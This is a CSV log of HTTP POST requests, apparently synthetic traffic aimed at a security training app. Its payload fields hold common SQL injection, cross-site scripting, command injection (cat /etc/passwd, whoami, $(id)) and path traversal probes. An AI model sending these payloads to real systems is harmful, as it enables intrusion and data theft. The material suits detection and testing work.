_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
3ce93b4c-fa4a-4d01-9790-8f86d65dee3c,64082c15852c28dc964951c811154456,14741,182.0.251.202,POST,service/restxml,HTTP/1.1,payload=; cat /etc/passwd ,404,2025-11-26T13:19:21.897308
804b2099-4e5b-4f57-816d-37999f3ea3bb,0993d176707ac8ff646097cdf5c90ee7,14753,207.10.143.97,POST,cia/command-injection,HTTP/1.1,"payload=UNION SELECT NULL, NULL -- 05271ea2",404,2025-11-26T13:19:21.979126
de85f6e1-f3eb-482a-85b6-b519e941f074,6e9f90358fbce79bf4fa8bddaa359746,279,143.162.195.71,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=`ping 127.0.0.1` -- a838219f,200,2025-11-26T13:19:22.074355
ab8d54d3-bf6a-43d1-acfd-3711953eb69d,009fd61580254e924eb61937841eb7a1,279,195.18.187.40,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=1; DROP TABLE users -- f0bcb97b,200,2025-11-26T13:19:22.156821
510bc757-1588-4167-ac61-0146634c8f47,c025a6167313987f06780f5d08c8b147,14741,215.172.177.233,POST,service/restxml,HTTP/1.1,payload=<img src=x onerror=alert(1)>&nonce=aad741ac,404,2025-11-26T13:19:22.267552
c9eb270d-4343-453e-b8f7-0c493e5f94af,21883700706e78825f60f557cacb09dc,14753,171.85.95.156,POST,cia/command-injection,HTTP/1.1,"payload=638a38f6 '""><script>alert(1)</script>",404,2025-11-26T13:19:22.350588
5575a952-22f2-4d55-9f37-055a329bb037,693c91bcb0d7ebd696e51321dc6ed891,279,15.92.31.75,POST,CrossSiteScripting/attack1,HTTP/1.1,"payload=UNION SELECT NULL, NULL ",200,2025-11-26T13:19:22.462111
9ac44f2c-9198-4461-ab14-5113968c8f8d,70093337e6325c989a27842d3f042754,14741,135.3.18.37,POST,service/restxml,HTTP/1.1,payload=<svg/onload=alert(1)> -- 21b52ded,404,2025-11-26T13:19:22.543772
002152c1-3e54-4ba7-af11-835693cc249c,c9770c618cf32b5968c6f42171d22191,15972,87.181.220.188,POST,SqlInjection/attack8,HTTP/1.1,"payload=UNION SELECT NULL, NULL&nonce=42af619c",400,2025-11-26T13:19:22.612627
c49aabba-07e8-4cf1-b44c-185742b3c0d9,b124b16ffcdbc984342b1afac8ebf9d7,15972,181.216.216.167,POST,SqlInjection/attack8,HTTP/1.1,payload=1; DROP TABLE users -- 0225db49,400,2025-11-26T13:19:22.755140
354fc950-af9d-4277-b211-378b031a537e,7a9bde220e3fd35cc0c8d8f9eb5c5fd3,14753,35.177.9.246,POST,cia/command-injection,HTTP/1.1,payload=' OR 1=1# -- a4458f15,404,2025-11-26T13:19:22.817608
6b7c1346-802e-4a00-948c-faa2aadd5194,31ccee57612c742cf84daab1c6398fe0,14741,116.164.159.130,POST,service/restxml,HTTP/1.1,payload=../../../../etc/passwd&nonce=616f0d5a,404,2025-11-26T13:19:22.892694
4a2fd53f-33fe-4295-b73b-65b4d89a600f,e072638c25dd949a3293f1c69c943dd7,279,118.53.163.159,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=e346b679 WAITFOR DELAY '0:0:5',200,2025-11-26T13:19:22.962140
bbcb7d28-30b6-431f-aa61-422086027e90,02433bf79fd3a1fe541a76faaf5bccd0,279,4.23.232.136,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR '1'='1 -- 65d707df,200,2025-11-26T13:19:23.047073
ba032ea8-6f80-4c36-809c-054f28dbb048,cdddfadb4f3f995a74bf3ef4cbdabf78,279,38.219.153.80,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=/proc/self/environ&nonce=50ae3e35,200,2025-11-26T13:19:23.143609
da45fcf7-a963-4756-b1c6-d337cad5833c,6ec80f73e3edbcbe6d04dccb11743189,279,223.83.172.154,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=<script>alert('XSS')</script> -- 181766f1,200,2025-11-26T13:19:23.242459
9fe89c9e-5afb-4234-9ad5-5060b6976186,17392fc3bfc9d5c4434bf7afd2c8ea1e,14753,152.98.212.66,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1` -- 4ce5bf70,404,2025-11-26T13:19:23.341996
d36ea797-4494-4e68-a205-5caa4f40e7ee,ca18dc4c7f6117b7930923a9ed866f2c,14753,166.67.172.229,POST,cia/command-injection,HTTP/1.1,payload=8790391b ../../../../etc/passwd,404,2025-11-26T13:19:23.428024
5a262f3d-3dda-4540-9421-df7e92f93e8c,442969864f9a4635193b836732950b9b,14753,100.26.44.174,POST,cia/command-injection,HTTP/1.1,payload=; cat /etc/passwd ,404,2025-11-26T13:19:23.519455
2e728783-f361-43f9-92cb-e93ff7d47bfc,c004505020b034d4ec8be67cd65c9ec1,15972,176.148.102.169,POST,SqlInjection/attack8,HTTP/1.1,payload=5f7ad1bb ' OR 1=1#,400,2025-11-26T13:19:23.612906
ceed4908-f11d-4b78-ade5-5828f74a40fb,6602aa1203524dc830412b0894299490,15972,71.44.191.155,POST,SqlInjection/attack8,HTTP/1.1,payload=&& whoami ,400,2025-11-26T13:19:23.682126
4f12a09d-97ae-4d2b-a1cc-f16cc85e4249,2445aed135f51a95f770b0f66e038aa5,14741,160.246.232.37,POST,service/restxml,HTTP/1.1,payload=| dir -- 23e4746c,404,2025-11-26T13:19:23.737721
75c23fe0-7344-47cd-b72c-016d4450706c,8f4259396163a14f2d8c8ce157326a73,15972,19.243.22.209,POST,SqlInjection/attack8,HTTP/1.1,payload=bd4f36af ; cat /etc/passwd,400,2025-11-26T13:19:23.832065
d0af1c1a-b7fe-4350-804b-2df5037c4693,7b000bff7561959073b8d98f0960a36d,14741,86.158.165.213,POST,service/restxml,HTTP/1.1,payload=<svg/onload=alert(1)> -- 84396bcc,404,2025-11-26T13:19:23.922250
b1d23311-7d83-4577-b51c-d83aac5ed4a0,d07c44888e6b7ae4de3f32a3d177c6f9,14741,174.7.56.40,POST,service/restxml,HTTP/1.1,"payload='""><script>alert(1)</script> -- 8a2988a6",404,2025-11-26T13:19:23.979876
e6d7dfae-3aef-46d8-b827-e7c9db49d643,2503017cc79a43851503bb4e9d409d54,15972,95.60.63.177,POST,SqlInjection/attack8,HTTP/1.1,payload=javascript:alert(1) ,400,2025-11-26T13:19:24.074311
61cd0e0c-113d-4b74-b4d7-b9f81ef2c8fa,5fe6e49149bd253cbddb8de67801e354,279,80.33.211.181,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=ed8fee14 WAITFOR DELAY '0:0:5',200,2025-11-26T13:19:24.170554
56a6dacc-b988-4878-88b2-1be3092d5a41,7cc9ad7fb9877534599f18b1fa6b46db,14741,133.216.38.112,POST,service/restxml,HTTP/1.1,payload=..\..\..\windows\win.ini -- c72727e8,404,2025-11-26T13:19:24.240593
41f8a3f1-800b-4945-8fb8-016a0cf2d780,f745daeaa0e765bf5c5b08e4bd4d9fd8,15972,147.64.132.240,POST,SqlInjection/attack8,HTTP/1.1,payload=9dc93651 ' OR '1'='1,400,2025-11-26T13:19:24.311716
d34a79b9-f37a-41a0-ab8e-c3c35e07a5ef,713d3ab122a0542fb1b140fcad98347d,14741,152.171.21.49,POST,service/restxml,HTTP/1.1,payload=`ping 127.0.0.1` -- 470dc5b8,404,2025-11-26T13:19:24.381922
31c530ba-6fe0-4fb7-b52a-57cadbd1e59f,551e90a6d4a2c77fa206776c59e83bd2,279,33.93.56.104,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=`ping 127.0.0.1` ,200,2025-11-26T13:19:24.449419
1d33d310-6e83-4acc-8fcc-51ea5cc44d37,e23efb17a4bd8d0e530b358246eeb3bd,14741,72.7.104.57,POST,service/restxml,HTTP/1.1,payload=<svg/onload=alert(1)>&nonce=2d27dd39,404,2025-11-26T13:19:24.564461
85ba1cba-cfee-4d98-9e75-7847f23b2bab,930861b0fac06ad2d923ed5756cd4287,15972,161.184.71.180,POST,SqlInjection/attack8,HTTP/1.1,payload=`ping 127.0.0.1` -- bf4e9899,400,2025-11-26T13:19:24.648106
f186f6d0-93a5-4896-83e8-429b66b6adde,6048fe20a40f96b975488712d586674b,14741,103.53.145.22,POST,service/restxml,HTTP/1.1,payload=7bb2383a ..\..\..\windows\win.ini,404,2025-11-26T13:19:24.719958
4172e1d9-2204-41ac-9a8f-eeb7e9d9314b,751c072e06bf85dbb0c0e5ff9bdb2030,15972,194.190.163.101,POST,SqlInjection/attack8,HTTP/1.1,payload=e3169e95 <img src=x onerror=alert(1)>,400,2025-11-26T13:19:24.761122
72931dc0-0b67-48e4-956b-a306601c2a1a,1873c51210c7b8de513d73ce301d41b5,14753,129.47.204.198,POST,cia/command-injection,HTTP/1.1,payload=<script>alert('XSS')</script> -- d0813fa7,404,2025-11-26T13:19:24.870337
e0ab4588-8674-49fc-ae2a-8a01bef2c562,0af55a836ed819466d2e7dbddbf30fbd,14753,38.195.215.119,POST,cia/command-injection,HTTP/1.1,payload=<script>alert('XSS')</script>&nonce=e3995943,404,2025-11-26T13:19:24.914582
1f10e01b-fb9c-4632-9a4f-6c5fb93ab25e,152dce1ca2baa4728dd2e642f5288d72,14741,17.179.203.200,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users -- 6ef78ac8,404,2025-11-26T13:19:25.008217
669881ae-817b-49c7-ad5b-4dd2db131a22,30cdcdcd60f4317c164fba1cfac296da,15972,46.219.17.129,POST,SqlInjection/attack8,HTTP/1.1,payload=$(id)&nonce=cda98498,400,2025-11-26T13:19:25.104621
fdd2de1f-8ec1-4226-a699-5e475d672950,dc6233928c7f997f168ff27f05ba6bda,279,9.177.44.224,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=| dir -- 0e33a868,200,2025-11-26T13:19:25.198905
084e1ea0-ea65-4235-b7ff-78bc60a9fa2a,2a603d61e3d12392db942bd9c7fa92a4,15972,134.206.55.166,POST,SqlInjection/attack8,HTTP/1.1,payload=f14d4ec7 | dir,400,2025-11-26T13:19:25.304747
268b8660-dc4d-48c0-9b8f-ce847a824997,bdc77dd07704b7a878465891c5d114c9,14741,102.254.94.119,POST,service/restxml,HTTP/1.1,payload=| dir -- 4caaae21,404,2025-11-26T13:19:25.396498
2101a951-48cd-4c86-b7b3-b577c59af19e,d999cb725dd0171fc0de1477eee1be65,14741,33.1.40.117,POST,service/restxml,HTTP/1.1,payload=c8f62d81 1; DROP TABLE users,404,2025-11-26T13:19:25.467749
6a66d737-a2a8-4a9a-b047-ee4186caf4a2,e0b5e551ae08ebffcc55a782f80fb3ce,15972,41.31.22.111,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)> -- 4932d943,400,2025-11-26T13:19:25.553175
0f7d846e-0588-4a1b-ad3e-dfbd66af9f56,690e114425cdc133514184c9651b6e55,15972,212.123.135.250,POST,SqlInjection/attack8,HTTP/1.1,payload=' OR 1=1#&nonce=63288c02,400,2025-11-26T13:19:25.686966
c29f6471-cee5-44a3-a879-969a7a8427f5,4214e5f502c2713201c7313794a46bdd,15972,80.138.255.201,POST,SqlInjection/attack8,HTTP/1.1,payload=' OR '1'='1 ,400,2025-11-26T13:19:25.741444
a7dd3ced-21ca-4951-89d2-ddf4da6f4783,d34c7ad807442aa401a0ae99c590e177,14753,179.164.118.4,POST,cia/command-injection,HTTP/1.1,payload=/proc/self/environ -- 9b20c622,404,2025-11-26T13:19:25.808483
76f4ca1e-907f-4868-99a5-c48aaf428949,a6df153b2ddf2b1c60604f4a62e97beb,15972,124.127.156.192,POST,SqlInjection/attack8,HTTP/1.1,payload=89e90903 javascript:alert(1),400,2025-11-26T13:19:25.878808
c65c7145-d7d3-4a8a-82fe-5d01db1095ce,f9aac3a9fe1884d2bfc9d55e17f95a93,14753,118.35.137.131,POST,cia/command-injection,HTTP/1.1,payload=' OR '1'='1&nonce=f23efa19,404,2025-11-26T13:19:25.961907
809cf2de-d0bd-4c55-b13b-5b513a88ffaf,d374b16635d7cc50a61b22f734db6457,14753,78.233.59.49,POST,cia/command-injection,HTTP/1.1,payload=&& whoami&nonce=858189db,404,2025-11-26T13:19:26.018571
f62dad3f-f7f5-421f-aa22-e375c7c916f5,5ab88a597a3c6d979d06c3381eaa96b4,279,18.111.109.136,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=<svg/onload=alert(1)>&nonce=bf93c114,200,2025-11-26T13:19:26.130799
25be4407-584b-4cd3-9b4d-20a3bfd78ee1,9bc8d96b80285806f7b32a1be9d55e2b,14741,174.172.155.83,POST,service/restxml,HTTP/1.1,payload=$(id)&nonce=7820a0be,404,2025-11-26T13:19:26.245508
f75c00c1-c6ed-4b91-9d50-af911cdef277,730fd2dad84991174d355983fd9a4739,14741,144.124.164.12,POST,service/restxml,HTTP/1.1,payload=`ping 127.0.0.1` -- 80af1716,404,2025-11-26T13:19:26.316888
d1573877-2482-48bf-89ec-52e3b08dde79,a7b5d7ddb62ca2a6a2c33b1d4a5b0917,15972,53.92.110.77,POST,SqlInjection/attack8,HTTP/1.1,payload=; cat /etc/passwd -- 5f7bf1e7,400,2025-11-26T13:19:26.424456
c3d7e0dc-8b70-4166-927b-9e164ce3ddf8,92245a5998f9951f024d8173a210ee02,15972,41.241.87.20,POST,SqlInjection/attack8,HTTP/1.1,payload=<script>alert('XSS')</script>&nonce=6a9c2831,400,2025-11-26T13:19:26.492651
be3c0c11-8a93-4a38-91e2-0fabdb5e687f,1deafe910dd95c781223e697f0c39010,14741,125.196.22.219,POST,service/restxml,HTTP/1.1,payload=&& whoami&nonce=b7527766,404,2025-11-26T13:19:26.562604
9e6a9fb9-910b-4957-9ca9-23816400df91,ad98056737ea8e936523f8ec9f2843a7,14753,186.68.3.2,POST,cia/command-injection,HTTP/1.1,payload=..\..\..\windows\win.ini ,404,2025-11-26T13:19:26.600803
e235934c-21f6-480b-8274-889e1830f8ee,bb04ea4e5cbecafff3ea08a842dd3cac,279,97.114.46.95,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=&& whoami -- 5d51e496,200,2025-11-26T13:19:26.711272
73c4de7e-22f9-469b-8c7d-c672e59292c0,049857b9673bd27282f63482c11f8103,15972,6.228.164.185,POST,SqlInjection/attack8,HTTP/1.1,payload=WAITFOR DELAY '0:0:5'&nonce=bac550a5,400,2025-11-26T13:19:26.816552
2368fbd3-a103-45ab-b56b-0d35f7026899,fdff9d9c79b10fdadcaeb5b4e7ab1dd1,15972,81.183.112.46,POST,SqlInjection/attack8,HTTP/1.1,payload=../../../../etc/passwd&nonce=1bc1c5bd,400,2025-11-26T13:19:26.905969
446852c3-0d63-4d79-b629-58d948451097,020aea943427752f071008ca9439fac3,15972,46.131.24.178,POST,SqlInjection/attack8,HTTP/1.1,payload=' OR 1=1#&nonce=e09343bd,400,2025-11-26T13:19:26.974967
1641abff-d8f6-49e1-9b8f-d3fadee10038,d0616094400ca9eeda770a16871f0f47,14741,217.77.15.80,POST,service/restxml,HTTP/1.1,payload=4a1e2dd8 `ping 127.0.0.1`,404,2025-11-26T13:19:27.028684
a6afd3ab-2f31-4fe9-9e1c-6644f2082638,f32dd71563fde78aa5ea3d69cce03f96,14741,94.221.229.111,POST,service/restxml,HTTP/1.1,payload=/proc/self/environ&nonce=f57dba0a,404,2025-11-26T13:19:27.122322
603119fa-f266-47d5-9a63-9ba8dbd69c46,d71ab864a9ade61bdc938a35c05dffda,279,154.207.93.58,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR '1'='1&nonce=c9743453,200,2025-11-26T13:19:27.210005
a3398ec4-7279-49ae-aa77-bc67dd61efe0,358cfd3f6be4e2a2049cf3947096daa6,279,205.93.91.195,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=&& whoami -- 3e129168,200,2025-11-26T13:19:27.316339
359ab8ea-33b1-4149-ad8d-7a6f7c1f6ea0,139ff5d2467dc8dcd1a0c34f9b16d8b9,279,169.172.214.157,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=ab983dd0 <script>alert('XSS')</script>,200,2025-11-26T13:19:27.427547
0e1746e7-641e-436f-ac98-9a6da39a701d,b4dac05ee7a97b4e3f414ce9a223a453,14741,41.109.182.227,POST,service/restxml,HTTP/1.1,payload=$(id) ,404,2025-11-26T13:19:27.508759
b817d24f-c675-414d-b5d7-3530bf97eeaa,71b4651fc3200403ee0ec118e5a4af1d,14753,41.244.9.47,POST,cia/command-injection,HTTP/1.1,payload=..\..\..\windows\win.ini -- cd2d4e68,404,2025-11-26T13:19:27.617567
99774c88-9195-4898-90ed-01382ccaf30b,4017798e4753efa6868d7038476d6ede,14753,115.24.114.244,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1`&nonce=c481947d,404,2025-11-26T13:19:27.715776
199c22a2-29bb-46f5-80e8-31a7a7c25817,ca2b7df53a337ee15ca20b2e4e27c645,279,194.236.213.176,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=44281617 ..\..\..\windows\win.ini,200,2025-11-26T13:19:27.802602
55749384-8a39-4aa9-b19b-8335bc0a37fc,ad02fb9743f10fb56ec1a538c34cbca6,14753,157.164.72.29,POST,cia/command-injection,HTTP/1.1,payload=03a0ab40 ..\..\..\windows\win.ini,404,2025-11-26T13:19:27.895322
21567a88-5d29-4ede-a4d1-6b64abf9b0d4,b08c7af1b43043a7019f9e43b4c05331,14753,191.253.145.3,POST,cia/command-injection,HTTP/1.1,"payload='""><script>alert(1)</script> -- 94ea8354",404,2025-11-26T13:19:27.976720
334281e0-5533-4a2e-bf94-b833a03aead4,462266233b8ff303bddc8321fc4575dd,14741,195.110.141.28,POST,service/restxml,HTTP/1.1,"payload='""><script>alert(1)</script> ",404,2025-11-26T13:19:28.087777
377c9eda-89bf-4715-901b-1cd7597aa17f,ee404e7fea0d7b72741cdaf6f28afa9c,14741,108.47.114.223,POST,service/restxml,HTTP/1.1,payload=829eca07 $(id),404,2025-11-26T13:19:28.159796
24cc2a01-a24f-4c96-ba3f-41ffd4487467,a068479cb235afcbececbdd919d5441d,15972,31.35.2.49,POST,SqlInjection/attack8,HTTP/1.1,payload=..\..\..\windows\win.ini -- 203dab90,400,2025-11-26T13:19:28.256150
a0c1fb00-8621-45d5-87f8-6ba5779b0e1e,23bae5eb35ad494685b39ba45021e801,14753,48.145.130.58,POST,cia/command-injection,HTTP/1.1,"payload='""><script>alert(1)</script> ",404,2025-11-26T13:19:28.343863
f30683e6-8319-4328-83c0-e8e1f43b8430,fc23e2c7eabcca1fdfbe934a36a9f6d5,14753,71.40.216.3,POST,cia/command-injection,HTTP/1.1,payload=c66bed97 /proc/self/environ,404,2025-11-26T13:19:28.469750
b458be49-86d2-4bc6-b869-baa9a18e486c,b0e7c07f2acfa2637edc636b847e06bd,14741,145.4.133.80,POST,service/restxml,HTTP/1.1,payload=175ba3c2 <svg/onload=alert(1)>,404,2025-11-26T13:19:28.566397
1dfcc4fe-875a-4459-9594-27dcfb73885a,ade98ddf679a3432dfa4c70f55d4233b,14741,40.82.230.123,POST,service/restxml,HTTP/1.1,payload=../../../../etc/passwd&nonce=100c5e2d,404,2025-11-26T13:19:28.634709
52e3d557-1e14-4917-9344-e2db16b6739b,7d14cf9c03d9e2f3d912d7e949d05543,14741,189.192.6.206,POST,service/restxml,HTTP/1.1,payload=| dir -- 696faa59,404,2025-11-26T13:19:28.731638
475da416-0d94-4847-ab23-4b5333d63d38,a610e53ea4137bc0e5689d6fbc4ac74b,14741,180.239.176.136,POST,service/restxml,HTTP/1.1,payload=; cat /etc/passwd&nonce=68236f92,404,2025-11-26T13:19:28.824420
f185654f-4f3d-43e6-9bf3-5705382cc617,23a159ea2f33a4b52f764e92ad27fa13,279,217.47.117.233,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=1; DROP TABLE users&nonce=1cb2ea3b,200,2025-11-26T13:19:28.927709
1dc2613b-9575-45bb-a571-db1736738c6d,837c468c65ff4dbb22c9b6eada6460eb,14741,110.106.135.27,POST,service/restxml,HTTP/1.1,"payload=UNION SELECT NULL, NULL&nonce=3ab04a98",404,2025-11-26T13:19:29.034104
84f23212-2bdc-4925-a743-10814f2556f1,af709c411f8364b33d816f914d1113d3,14753,129.122.49.169,POST,cia/command-injection,HTTP/1.1,payload=c681be82 ..\..\..\windows\win.ini,404,2025-11-26T13:19:29.162973
1ed72164-4aac-45ca-ac7e-5b0a726162a3,0b2b66e236257677dd8aa1dbd8afd66d,279,45.179.131.129,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=..\..\..\windows\win.ini&nonce=54a1bae8,200,2025-11-26T13:19:29.232625
9be53f22-093c-4fbd-a0dd-a22d3bc2bc59,1a7a22b98c33b7cd855263deff66e29c,14741,82.160.145.159,POST,service/restxml,HTTP/1.1,payload=WAITFOR DELAY '0:0:5' ,404,2025-11-26T13:19:29.304525
2117bda6-8c9f-4e74-ade7-623fe21a5d01,a0a0fb0eff23cdff054ba03e3e081074,15972,161.135.167.121,POST,SqlInjection/attack8,HTTP/1.1,payload=' OR '1'='1&nonce=e32f2ce5,400,2025-11-26T13:19:29.405357
10c8d96c-86d5-4a64-b189-88efd100c830,be6d989d53c732a221e7cd3cab630422,15972,34.45.130.20,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)>&nonce=27a6d7a7,400,2025-11-26T13:19:29.506980
6a94492f-ecc3-4c52-bcd2-acd617d54a5e,92d044cd65ed38cb5eb5bf58bb78be0d,14753,89.248.29.177,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1`&nonce=909fc266,404,2025-11-26T13:19:29.547643
b5fb60c3-eec4-47d1-b633-0b116d545506,7a1c1d087503b88a16ffd4c796c0eab1,14753,50.199.116.161,POST,cia/command-injection,HTTP/1.1,payload=<svg/onload=alert(1)>&nonce=2f4c3118,404,2025-11-26T13:19:29.624028
67487460-be3f-4292-9cca-b76360dcbd38,ae53c8f67d3b5c69a334f3538f2218e5,14753,85.35.60.19,POST,cia/command-injection,HTTP/1.1,payload=1; DROP TABLE users -- 49e3ac02,404,2025-11-26T13:19:29.709246
5cf8b71d-89b6-43e4-be09-8f2c3a93a971,dfacbc6ddc9912d11ca99e75a8c21137,15972,77.63.242.83,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)> -- b87eee95,400,2025-11-26T13:19:29.782148
99f9d4b8-3e4d-43bf-9787-9f4d94dcd18a,0e391507e01b9f7563307dc4ac83027a,14741,177.127.144.25,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users&nonce=832bd6ce,404,2025-11-26T13:19:29.878483
0da96c8c-45c4-4d49-a8e7-9f39088b4668,60ceed6f7a9133c23e97f81849ae434e,14741,18.61.105.26,POST,service/restxml,HTTP/1.1,payload=a748e9c3 $(id),404,2025-11-26T13:19:29.938466
c133d8f3-6153-4db5-82e5-1d4395402215,b36c613f14506ab760b7c6ad67a3900c,279,68.241.216.44,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=03d1370d /proc/self/environ,200,2025-11-26T13:19:30.021968
338c4507-1ecc-4cb0-b985-728311eb8301,9f92f73c9c697a69badf10908d9ed69f,14741,80.153.180.213,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users&nonce=9d644e5e,404,2025-11-26T13:19:30.159688
b0fc97ad-de93-40ac-9458-29206d62ff83,9eb385f54aa4e917bafa69bda00ffea6,15972,38.95.172.213,POST,SqlInjection/attack8,HTTP/1.1,payload=javascript:alert(1) -- 7d1bdade,400,2025-11-26T13:19:30.253624
0def3f89-728e-4ae6-b870-a07abf917861,441d7aa988ed463c00ad314e5069ba34,279,187.227.255.43,POST,CrossSiteScripting/attack1,HTTP/1.1,"payload='""><script>alert(1)</script> -- 02f758ee",200,2025-11-26T13:19:30.336117
34f26f56-b0a2-45bd-ae4f-f7f5e8f18ee0,61fd2cf5493641a643f87e5fb37f55fd,279,169.52.106.106,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR '1'='1&nonce=73245791,200,2025-11-26T13:19:30.411192
fc227f3e-ca5f-4120-87e9-bb5a7e5dfefc,f4aadd62e246ec5d59e6da9ef7b1f77c,14753,182.50.15.186,POST,cia/command-injection,HTTP/1.1,payload=javascript:alert(1) ,404,2025-11-26T13:19:30.504178
aa65ef9c-3b11-4d33-b1f3-e3d1325e1a42,82bdcee7b81b57cbb42c69990ee819ad,279,133.34.76.80,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=1; DROP TABLE users&nonce=f5526912,200,2025-11-26T13:19:30.639545
0f2a9bfc-7847-4cb8-b7a8-aa4a1e645918,7cc53897c5cb30332a3b68bc0987e58d,14741,217.226.220.90,POST,service/restxml,HTTP/1.1,payload=; cat /etc/passwd&nonce=2695055b,404,2025-11-26T13:19:30.740321
2124f067-80f3-4d84-9a35-d09cd11ddbf9,1c293795a760df89787d4a10e07ae098,14741,39.174.119.7,POST,service/restxml,HTTP/1.1,payload=`ping 127.0.0.1` ,404,2025-11-26T13:19:30.809416
0b52b59c-fe16-4216-b6ca-b97f88f7f6c7,b1fe0a12eb78ee6d31bfd6af240ad9e3,15972,13.236.76.232,POST,SqlInjection/attack8,HTTP/1.1,payload=$(id)&nonce=dbb4ed9f,400,2025-11-26T13:19:30.881436
cfbd1d0d-b236-49fd-8498-d2f3c2b41fbe,3d2c5766f11ed8c7f42f80a395aef7c0,15972,20.8.100.161,POST,SqlInjection/attack8,HTTP/1.1,payload=&& whoami -- 065c2d9c,400,2025-11-26T13:19:30.951586
b7948779-049e-460e-88eb-e28dab5eeb4b,fea147eac211a51752c3016ca262847f,14753,116.179.86.227,POST,cia/command-injection,HTTP/1.1,payload=<script>alert('XSS')</script> -- bf53885f,404,2025-11-26T13:19:31.073673
920ab860-c1d7-4d2c-94fb-fd14e9f90f51,9303d16220cdad51dbbe5b9195d1a7e9,15972,41.187.115.255,POST,SqlInjection/attack8,HTTP/1.1,payload=e76bef93 && whoami,400,2025-11-26T13:19:31.132959
c34f24ea-6ee3-4b1a-8886-b40e2ffa45b3,2633216837ee4e110fd21977ee986e01,14753,20.128.81.115,POST,cia/command-injection,HTTP/1.1,payload=af31c7d4 ' OR '1'='1,404,2025-11-26T13:19:31.236022
90725814-cafd-4948-a669-70858a9daa28,6b3ad18f80a0ec6932fc9c350d920703,279,12.165.78.131,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR 1=1# -- 288cec43,200,2025-11-26T13:19:31.292268
3f990665-cc24-4ce5-9174-a50d785715d8,81f2dd26235de8d241ad73b6722ddc11,14741,72.48.232.236,POST,service/restxml,HTTP/1.1,payload=afbfb842 javascript:alert(1),404,2025-11-26T13:19:31.394013
4661bbbe-fae2-496a-a342-c50cadf40ca3,f89c6ccb59190d0a3510bc5adbdfd870,279,28.35.87.217,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=9c602b75 <svg/onload=alert(1)>,200,2025-11-26T13:19:31.491017
003bbffd-cb3e-4a08-9bfc-6b52ee3348bb,6a25967d14ba98e59ab1e71b4c094c74,14741,188.199.44.138,POST,service/restxml,HTTP/1.1,payload=../../../../etc/passwd ,404,2025-11-26T13:19:31.602374
d00570c5-c246-4f9d-bc12-4a70ca4d384c,037cad298d4ec70d3c416c0c380a27eb,14741,96.87.133.73,POST,service/restxml,HTTP/1.1,payload=bfe735dd ../../../../etc/passwd,404,2025-11-26T13:19:31.686958
0f28b100-d2d9-454b-8e1d-57a0ddf7b2f6,5f2e58d1b5088640f565a0e2410785ba,15972,130.226.152.17,POST,SqlInjection/attack8,HTTP/1.1,payload=..\..\..\windows\win.ini&nonce=dd585f75,400,2025-11-26T13:19:31.773403
